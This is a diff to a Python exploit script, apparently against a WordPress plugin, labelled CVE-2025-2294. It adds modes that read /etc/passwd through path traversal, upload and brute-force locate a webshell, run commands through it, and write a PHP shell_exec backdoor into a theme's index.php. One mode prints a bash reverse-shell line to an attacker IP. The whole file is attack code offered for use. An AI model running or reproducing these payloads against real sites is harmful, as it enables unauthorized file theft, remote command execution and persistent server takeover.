@@ -3,6 +3,7 @@ import argparse
 import time
 import random
 import string
+import os
 
 session = requests.Session()
 requests.packages.urllib3.disable_warnings()
@@ -93,34 +94,95 @@ def execute_cmd_via_webshell(shell_url, cmd):
     except requests.RequestException:
         print("[-] Command execution failed.")
 
+def check_webshell(shell_url):
+    try:
+        response = session.get(shell_url, timeout=10)
+        if response.status_code == 200:
+            print(f"[+] WebShell is active: {shell_url}")
+        else:
+            print("[-] WebShell is not accessible.")
+    except requests.RequestException:
+        print("[-] WebShell check failed.")
+
+def brute_force_paths(target_url, file_list):
+    print("[*] Starting path brute force...")
+    for path in file_list:
+        test_url = f"{target_url}/wp-content/uploads/{path}"
+        try:
+            response = session.get(test_url, timeout=10)
+            if response.status_code == 200:
+                print(f"[+] WebShell found at: {test_url}")
+                return test_url
+        except requests.RequestException:
+            continue
+    return None
+
 def print_reverse_shell_payload(attacker_ip, port):
     print("[*] Reverse Shell Payload (bash):")
     payload = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
     print(payload)
 
-if __name__ == "__main__":
+def write_index_php(target_url):
+    print("[*] Writing WebShell to index.php...")
+    payload = "<?php if(isset($_REQUEST['cmd'])){echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>'; } ?>"
+    index_url = f"{target_url}/wp-content/themes/yourtheme/index.php"
+    try:
+        response = session.post(index_url, data=payload, timeout=10)
+        if response.status_code == 200:
+            print(f"[+] WebShell written to: {index_url}")
+        else:
+            print("[-] Failed to write index.php")
+    except requests.RequestException:
+        print("[-] Error while writing index.php")
+
+def main():
     print(banner)
     parser = argparse.ArgumentParser(description="CVE-2025-2294 Exploit Script")
     parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., https://example.com)")
-    parser.add_argument("-f", "--file", default="../../../../../../../../etc/passwd", help="File to read")
-    parser.add_argument("-c", "--cmd", help="Execute a command via uploaded WebShell")
+    parser.add_argument("-m", "--mode", required=True, choices=["check", "upload", "brute", "cmd", "reverse", "write"], help="Mode to run")
+    parser.add_argument("-f", "--file", default="../../../../../../../../etc/passwd", help="File to read (default: /etc/passwd)")
+    parser.add_argument("-c", "--cmd", help="Command to execute via WebShell")
     parser.add_argument("-r", "--reverse", nargs=2, metavar=('IP', 'PORT'), help="Show reverse shell command (no exec)")
+    parser.add_argument("--path", help="WebShell path to check or use")
     args = parser.parse_args()
 
     target_url = args.url.rstrip("/")
 
-    # Step 1: 文件读取
-    if exploit(target_url, args.file):
-        time.sleep(2)
+    if args.mode == "check":
+        print("[*] Checking vulnerability...")
+        if exploit(target_url, args.file):
+            print("[+] Target is vulnerable")
+        else:
+            print("[-] Target is not vulnerable")
 
-        # Step 2: 上传 WebShell
+    elif args.mode == "upload":
+        print("[*] Uploading WebShell...")
         shell = upload_webshell(target_url)
+        if shell:
+            check_webshell(shell)
 
-        if shell and args.cmd:
-            time.sleep(1)
-            execute_cmd_via_webshell(shell, args.cmd)
+    elif args.mode == "brute":
+        print("[*] Brute forcing WebShell paths...")
+        file_list = ["shell1.php", "shell2.php", "shell3.php"]  # Add more paths here
+        shell_path = brute_force_paths(target_url, file_list)
+        if shell_path:
+            check_webshell(shell_path)
 
-        # Step 3: 显示反弹命令
+    elif args.mode == "cmd":
+        if not args.path:
+            print("[-] WebShell path is required.")
+        else:
+            execute_cmd_via_webshell(args.path, args.cmd)
+
+    elif args.mode == "reverse":
         if args.reverse:
             ip, port = args.reverse
             print_reverse_shell_payload(ip, port)
+        else:
+            print("[-] Reverse shell IP and port required.")
+
+    elif args.mode == "write":
+        write_index_php(target_url)
+
+if __name__ == "__main__":
+    main()
